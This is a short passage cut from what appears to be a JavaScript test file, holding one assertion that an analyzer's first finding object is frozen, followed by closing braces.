    expect(Object.isFrozen(value.tier1.analyzers[0]?.findings[0])).toBe(true);
  });
});
